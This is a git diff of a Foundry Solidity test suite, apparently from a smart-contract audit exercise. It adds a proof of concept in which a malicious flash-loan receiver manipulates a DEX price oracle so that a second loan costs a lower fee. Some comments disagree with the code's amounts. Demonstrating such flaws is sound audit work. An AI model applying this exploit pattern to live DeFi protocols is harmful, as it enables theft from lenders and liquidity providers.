@@ -8,10 +8,10 @@ import { MockFlashLoanReceiver } from "../mocks/MockFlashLoanReceiver.sol";
 import { ERC20Mock } from "../mocks/ERC20Mock.sol";
 import { IFlashLoanReceiver } from "../../src/interfaces/IFlashLoanReceiver.sol";
 import { Address } from "@openzeppelin/contracts/utils/Address.sol";
-import { BuffMockTswap } from "../mocks/BuffMockTswap.sol";
-import { BuffMockPoolFactory} from "test/mocks/BuffMockPoolFactory.sol";
+import { BuffMockTSwap } from "/test/mocks/BuffMockTSwap.sol";
+import { BuffMockPoolFactory } from "test/mocks/BuffMockPoolFactory.sol";
 import { ERC1967Proxy } from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
-import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol"; 
+import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 
 contract ThunderLoanTest is BaseTest {
     uint256 constant AMOUNT = 10e18;
@@ -112,72 +112,76 @@ contract ThunderLoanTest is BaseTest {
         thunderLoan.redeem(tokenA, amountToRedeem);
     }
 
-    function testOracleManipulation() public { 
-    //1. First set up new contracts
-    thunderLoan = new ThunderLoan();
-    tokenA = new ERC20Mock();
-    // Here we are giving the proxy an implementation address of the logic contract.
-    proxy = new ERC1967Proxy(address(thunderLoan), "")
-    BuffMockPoolFactory pf = new BuffMockPoolFactory(address(weth));
-    // Creating a TSwap DEX for Weth/Token A
-    address tswapPool = pf.createPool(address(tokenA));
-    thunderLoan = ThunderLoan(address(proxy));
-    thunderLoan.initialize(address(pf));   // Initilizing the ThunderLoan contract with the Pool Factory address. 
-    // 2. Fund TSwap
-    // First play the role of the liquidity provider and deposit liquidity.
-    vm.startPrank(liquidityProvider);
-    tokenA.mint(liquidityProvider, 100e18);
-    tokenA.approve(address(tswapPool), 100e18);
-    weth.mint(liquidityProvider, 100e18);
-    weth.approve(address(tswapPool), 100e18);
-    // Deposit Liquidity into TSWAP (not thunderloan) using a liquidity providers
-    BuffMockTSwap(tswapPool).deposit(100e18, 100e18, 100e18, block.timestamp);
-    // Ratio of Liquidity pool is 100Weth to 100 Token A
-    // Price of Token A is 1 Weth
-    // 1:1
-    vm.stopPrank(); //Stop playing the role of the Liquidity provider
-    // Allow token A on thunderloan with owner account
-    vm.prank(thunderLoan.owner());
-    thunderLoan.setAllowedToken(tokenA, true);
-    // 3. Fund ThunderLoan 
-    // Deposit liquidity into THUNDERLOAN (not TSWAP)
-    vm.startPrank(liquidityProvider);
-    tokenA.mint(liquidityProvider, 1000e18);
-    tokenA.approve(address(thunderLoan), 1000e18);
-    thunderLoan.deposit(tokenA, 1000e18);
-    vm.stopPrank();
+    function testOracleManipulation() public {
+        //1. First set up new contracts
+        thunderLoan = new ThunderLoan();
+        tokenA = new ERC20Mock();
+        // Here we are giving the proxy an implementation address of the logic contract.
+        proxy = new ERC1967Proxy(address(thunderLoan), "");
+        BuffMockPoolFactory pf = new BuffMockPoolFactory(address(weth));
+        // Creating a TSwap DEX for Weth/Token A
+        address tswapPool = pf.createPool(address(tokenA));
+        thunderLoan = ThunderLoan(address(proxy));
+        thunderLoan.initialize(address(pf)); // Initilizing the ThunderLoan contract with the Pool Factory address.
+        // 2. Fund TSwap
+        // First play the role of the liquidity provider and deposit liquidity.
+        vm.startPrank(liquidityProvider);
+        tokenA.mint(liquidityProvider, 100e18);
+        tokenA.approve(address(tswapPool), 100e18);
+        weth.mint(liquidityProvider, 100e18);
+        weth.approve(address(tswapPool), 100e18);
+        // Deposit Liquidity into TSWAP (not thunderloan) using a liquidity providers
+        BuffMockTSwap(tswapPool).deposit(100e18, 100e18, 100e18, block.timestamp);
+        // Ratio of Liquidity pool is 100Weth to 100 Token A
+        // Price of Token A is 1 Weth
+        // 1:1
+        vm.stopPrank(); //Stop playing the role of the Liquidity provider
+        // Allow token A on thunderloan with owner account
+        vm.prank(thunderLoan.owner());
+        thunderLoan.setAllowedToken(tokenA, true);
+        // 3. Fund ThunderLoan
+        // Deposit liquidity into THUNDERLOAN (not TSWAP)
+        vm.startPrank(liquidityProvider);
+        tokenA.mint(liquidityProvider, 1000e18);
+        tokenA.approve(address(thunderLoan), 1000e18);
+        thunderLoan.deposit(tokenA, 1000e18);
+        vm.stopPrank();
 
-    // Now we have the following balances in the two contracts:
-    // TSWAP: 100 Weth, 100 Token A. (Price of Token A is 1 Weth)
-    // ThunderLoan: 1000 Token A
+        // Now we have the following balances in the two contracts:
+        // TSWAP: 100 Weth, 100 Token A. (Price of Token A is 1 Weth)
+        // ThunderLoan: 1000 Token A
 
-    // To manipulate the price of Token A on TSwap, we will do the following:
-    // 1. Take a 50 token A flash loan from ThunderLoan
-    // 2. Swap the 50 AToken's for Weth on Tswap. (Now the supply of Token A on tswap is 150 which decreases the price.)
-    // 3. Take ANOTHER flash loan of 50 Token A from ThunderLoan, and will be cheaper 
-    // because according to the Tswap oracle, you have a ~80/150 ratio of Weth to Token A 
-    // means the price of Token A is around 0.5 Weth, and the fee will be cheaper.
+        // To manipulate the price of Token A on TSwap, we will do the following:
+        // 1. Take a 50 token A flash loan from ThunderLoan
+        // 2. Swap the 50 AToken's for Weth on Tswap. (Now the supply of Token A on tswap is 150 which decreases the
+        // price.)
+        // 3. Take ANOTHER flash loan of 50 Token A from ThunderLoan, and will be cheaper
+        // because according to the Tswap oracle, you have a ~80/150 ratio of Weth to Token A
+        // means the price of Token A is around 0.5 Weth, and the fee will be cheaper.
 
-    // Get the fee for a normal flash loan of 50 A Token's.
-    uint256 normalFeeCost = thunderLoan.getCalculatedFee(tokenA, 50e18);
-    console2.log("Normal fee before price manipulation", normalFeeCost);
-    // 0.296147410319118389
+        // Get the fee for a normal flash loan of 50 A Token's.
+        uint256 normalFeeCost = thunderLoan.getCalculatedFee(tokenA, 100e18);
+        console2.log("Normal fee before price manipulation", normalFeeCost);
+        // 0.296147410319118389
 
-    uint256 amountToBorrow = 50e18; // Amount of Token A to flashLoan                                                             // mapping for USDC -> USDC asset token for LP's
-    MaliciousFlashLoanReceiver flr = new MaliciousFlashLoanReceiver(address(tswapPool), address(thunderLoan), address(thunderLoan.getAssetFromToken(tokenA)));
-    
-    // 4. We are going to take out 2 flash loans 
-    //     a. We will do this to first manipulate the price of token A on the TSwap Dex
-    //     b. To show that doing so greatly reduces the fees we pay on ThunderLoan 
-    vm.startPrank(user);
-    tokenA.mint(address(flr), 50e18);
-    thunderLoan.flashloan(address(flr), tokenA, amountToBorrow, "" );
-    vm.stopPrank();
+        uint256 amountToBorrow = 50e18; // Amount of Token A to flashLoan                                                             //
+            // mapping for USDC -> USDC asset token for LP's
+        MaliciousFlashLoanReceiver flr = new MaliciousFlashLoanReceiver(
+            address(tswapPool), address(thunderLoan), address(thunderLoan.getAssetFromToken(tokenA))
+        );
 
-    uint256 attackFee = flr.feeOne() + flr.feeTwo();
-    console.log("Attack Fee is: ", attackFee);
-    assert(attackFee < normalFeeCost);
-    
+        // 4. We are going to take out 2 flash loans
+        //     a. We will do this to first manipulate the price of token A on the TSwap Dex
+        //     b. To show that doing so greatly reduces the fees we pay on ThunderLoan
+        vm.startPrank(user);
+        tokenA.mint(address(flr), 100e18);
+        thunderLoan.flashloan(address(flr), tokenA, amountToBorrow, "");
+        vm.stopPrank();
+
+        uint256 attackFee = flr.feeOne() + flr.feeTwo();
+        console2.log("Attack Fee is: ", attackFee);
+        console2.log("Normal Fee is: ", normalFeeCost);
+        assert(attackFee < normalFeeCost);
     }
 }
 
@@ -191,6 +195,7 @@ contract MaliciousFlashLoanReceiver is IFlashLoanReceiver {
     // We want this contract to do the following things:
     // 1. Swap TokenA borrowed for WETH
     // 2. Take out ANOTHER flash loan, to show the difference
+
     constructor(address _tswapPool, address _thunderLoan, address _repayAddress) {
         tswapPool = BuffMockTSwap(_tswapPool);
         thunderLoan = ThunderLoan(_thunderLoan);
@@ -200,14 +205,14 @@ contract MaliciousFlashLoanReceiver is IFlashLoanReceiver {
     function executeOperation(
         address token,
         uint256 amount,
-        uint256 fee,    
-        address /*initiator*/, // we dont care about either of those params
+        uint256 fee,
+        address, /*initiator*/ // we dont care about either of those params
         bytes calldata /*params*/
-    ) 
-        externals
-        return (bool)
+    )
+        external
+        returns (bool)
     {
-        if(!attacked){
+        if (!attacked) {
             // 1. Swap TokenA borrowed for WETH
             // 2. Take out ANOTHER flash loan, to show the difference
             feeOne = fee;
@@ -222,7 +227,7 @@ contract MaliciousFlashLoanReceiver is IFlashLoanReceiver {
             // arg2 Slippage minimum to avoid getting a bad deal
             // arg3 deadline for txn
             // This does the swap and will TANK the price!
-            tswapPool.swapPoolTokenForWethBasedOnInputPoolToken(50e18, wethBought,block.timestamp);
+            tswapPool.swapPoolTokenForWethBasedOnInputPoolToken(50e18, wethBought, block.timestamp);
             // Now we have a lot of Token A
             // And minimum weth
             // so 1 weth used to be 10 token A
@@ -231,18 +236,18 @@ contract MaliciousFlashLoanReceiver is IFlashLoanReceiver {
             // Second Flash Loan!
             // this will call executeOperation, except attacked is true.
             thunderLoan.flashloan(address(this), IERC20(token), amount, "");
-            // repay 
-            IERC20(token).approve(address(thunderLoan), amount +fee);
-            thunderLoan.repay(IERC20(token),amount +fee);
-        }
-        else{
-            // calculate the fee 
+            // repay
+            // IERC20(token).approve(address(thunderLoan), amount + fee);
+            // thunderLoan.repay(IERC20(token), amount + fee);
+            IERC20(token).transfer(address(repayAddress), amount + fee);
+        } else {
+            // calculate the fee
             feeTwo = fee;
             // now repay
-            IERC20(token).approve(address(thunderLoan), amount +fee);
-            thunderLoan.repay(IERC20(token),amount +fee);
+            // IERC20(token).approve(address(thunderLoan), amount + fee);
+            // thunderLoan.repay(IERC20(token), amount + fee);
+            IERC20(token).transfer(address(repayAddress), amount + fee);
         }
         return true;
     }
-
 }
